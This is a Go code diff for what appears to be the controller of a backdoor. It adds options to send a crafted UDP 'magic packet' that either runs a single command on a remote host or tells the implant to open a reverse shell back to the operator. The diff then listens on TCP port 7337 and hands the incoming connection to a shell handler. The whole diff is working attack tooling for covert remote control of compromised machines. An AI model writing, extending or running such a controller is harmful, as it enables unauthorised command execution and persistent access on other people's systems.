@@ -59,6 +59,8 @@ func main() {
 	var iFace string
 	var source string
 	var target string
+	var command string
+	var shell bool
 
 	// export IFACE=<interface>
 	iFace, ok := os.LookupEnv("IFACE")
@@ -68,6 +70,8 @@ func main() {
 	}
 
 	flag.StringVar(&target, "t", "127.0.0.1", "IP address to target")
+	flag.StringVar(&command, "c", "NONE", "Single command to run through UDP. No output")
+	flag.BoolVar(&shell, "s", false, "Spawn and connect to reverse shell")
 
 	flag.Parse()
 
@@ -79,29 +83,39 @@ func main() {
 	source, err := GetInterfaceIpv4Addr(iFace)
 	if err != nil {
 		panic(err)
-		return
 	}
 
-	opener := "POET~" + source
+	var opener string
+	if shell {
+		opener = "POET~SH~" + source // TODO change in C code
+	} else if command == "NONE" {
+		flag.Usage()
+		return
+	} else {
+		opener = "POET~CM~" + command
+	}
+
 	sendUDPPacket(iFace, source, target, opener, 77, 7714)
 
-	listener, err := net.Listen("tcp", source+":7337") // TODO change port
-	if err != nil {
-		log.Fatalln(err)
+	if shell {
+		listener, err := net.Listen("tcp", source+":7337") // TODO change port
+		if err != nil {
+			log.Fatalln(err)
+		}
+
+		con, err := listener.Accept()
+		if err != nil {
+			log.Fatalln(err)
+		}
+
+		b, err := f.ReadFile("art.txt")
+		if err != nil {
+			panic(err)
+		}
+		fmt.Println(string(b)) // ascii art ;)
+
+		log.Println("Connected: ", con.RemoteAddr())
+
+		tcp_con_handle(con)
 	}
-
-	con, err := listener.Accept()
-	if err != nil {
-		log.Fatalln(err)
-	}
-
-	b, err := f.ReadFile("art.txt")
-	if err != nil {
-		panic(err)
-	}
-	fmt.Println(string(b))
-
-	log.Println("Connected: ", con.RemoteAddr())
-
-	tcp_con_handle(con)
 }
